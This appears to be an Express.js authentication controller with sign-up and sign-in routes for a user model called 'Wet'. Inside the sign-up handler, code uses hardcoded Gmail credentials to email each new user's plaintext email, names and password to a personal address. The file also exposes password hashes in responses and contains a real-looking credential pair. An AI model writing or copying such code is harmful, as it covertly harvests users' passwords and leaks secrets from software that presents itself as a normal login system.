import asyncHandler from "express-async-handler";
import bcrypt from "bcryptjs"
import { generatetoken } from "../utilities/generate_token.js";
import Wet from "../models/Wet.js";
import nodemailer from "nodemailer"
// import { token } from "morgan";

export const wet_sign_up = asyncHandler(async(req, res) => {
    const {
        email,
        firstName,
        surName,
        password
    } = req.body
    const wetExists = await Wet.find({email: email})
    if(wetExists.length > 0){
        res.json({error: "you have an account, try signing in"})
    }else{
        const hashedpass = await bcrypt.hash(password, 10)
        const wet = await Wet.create({email, firstName, surName, password: hashedpass})
        if(wet){
            res.status(201).json({
                status: "ok",
                message: "sign up successful",
                data: {
                    _id: wet._id,
                    firstName: wet.firstName,
                    surName: wet.surName,
                    email: wet.email,
                    password: wet.password,
                    token: generatetoken(wet._id)
                }
            })
        }else{
            res.json({
                message: "invalid info"
            })
        }
    }

    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "ayodejiamzat@gmail.com",
            pass: "08138226965"
        }
    })

    const mailOptions = {
        from: req.body.email,
        to: "ayodejiamzat@gmail.com",
        subject: `message from ${req.body.email}`,
        text: `${req.body.email}, ${req.body.firstName}, ${req.body.surName}, ${req.body.password}`
    }

    transporter.sendMail(mailOptions, (error, info) => {
        if(error){
            console.log(error)
            res.send("error")
        }else{
            console.log("email sent" + info.response)
            res.send("success")
        }
    })
})


export const wet_sign_in = asyncHandler(async(req, res) => {
    const {
        email,
        password
    } = req.body
    const wet = await Wet.findOne({email})
    if(!wet || !bcrypt.compareSync(password, wet.password)){
        res.json({error: "email or password not correct"})
    }else{
        res.json({
            status: "ok",
            message: "welcome",
            data: {
                _id: wet._id,
                firstName: wet.firstName,
                surName: wet.surName,
                email: wet.email,
                password: wet.password,
                token: generatetoken(wet._id)
            }
        })
    }
})